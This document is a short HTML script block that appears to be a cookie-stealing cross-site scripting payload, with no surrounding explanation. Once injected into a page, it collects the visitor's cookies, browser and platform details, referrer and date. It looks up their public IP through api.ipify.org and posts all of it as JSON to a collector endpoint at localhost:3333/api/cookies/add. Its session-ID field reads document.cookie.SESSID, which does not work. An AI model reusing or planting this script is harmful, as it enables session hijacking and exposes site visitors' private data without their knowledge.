<script>
  var request;
  var url = "http://localhost:3333/api/cookies/add";
  request = new XMLHttpRequest();
  request.open("POST", url, true);
  request.setRequestHeader("Content-Type", "application/json");

  var data = {
    port: location.port == 0 ? 80 : location.port,
    browserInformation: navigator.appCodeName,
    clientOperatingSystem: navigator.platform,
    referrer: document.referrer,
    sessionId: document.cookie.SESSID,
    cookie: document.cookie,
    date: new Date(),
  };

  var url2 = "https://api.ipify.org/";
  var ip = "";
  request2 = new XMLHttpRequest();
  request2.onreadystatechange = function () {
    if (request2.readyState === 4) {
      data["clientIpAddress"] = request2.response;
      request.send(JSON.stringify(data));
    }
  };

  request2.open("GET", url2, true);
  request2.send();
</script>

